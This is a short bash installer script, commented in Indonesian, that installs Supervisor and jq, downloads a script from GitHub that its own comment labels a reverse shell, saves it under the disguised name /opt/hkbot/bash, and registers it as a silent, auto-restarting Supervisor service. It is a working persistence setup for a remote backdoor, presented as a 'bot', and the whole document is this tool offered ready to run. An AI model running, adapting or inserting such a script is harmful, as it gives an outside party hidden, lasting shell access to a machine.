#!/bin/bash
echo "[+] Menginstal dependensi yang dibutuhkan..."

# Pastikan Supervisor dan jq terinstal
if ! command -v supervisorctl &> /dev/null; then
    echo "[+] Menginstal Supervisor..."
    sudo apt update && sudo apt install -y supervisor
fi

if ! command -v jq &> /dev/null; then
    echo "[+] Menginstal jq..."
    sudo apt install -y jq
fi

# Buat direktori jika belum ada
mkdir -p /opt/hkbot/

# Unduh script reverse shell
wget -O /opt/hkbot/bash https://github.com/Dejavu666/hkbot/raw/refs/heads/main/nc_telegram.sh
chmod +x /opt/hkbot/bash

# Buat konfigurasi Supervisor
cat <<EOF > /etc/supervisor/conf.d/hkbot.conf
[program:hkbot]
command=/bin/bash -c 'nohup /bin/bash /opt/hkbot/bash > /dev/null 2>&1 &'
autostart=true
autorestart=true
stderr_logfile=/var/log/hkbot.err.log
stdout_logfile=/var/log/hkbot.out.log
EOF

# Restart Supervisor untuk memuat konfigurasi baru
sudo supervisorctl reread
sudo supervisorctl update
sudo supervisorctl start hkbot

echo "[+] Instalasi selesai. Bot berjalan otomatis dengan Supervisor."
echo "[+] Gunakan 'sudo supervisorctl status hkbot' untuk melihat status bot."
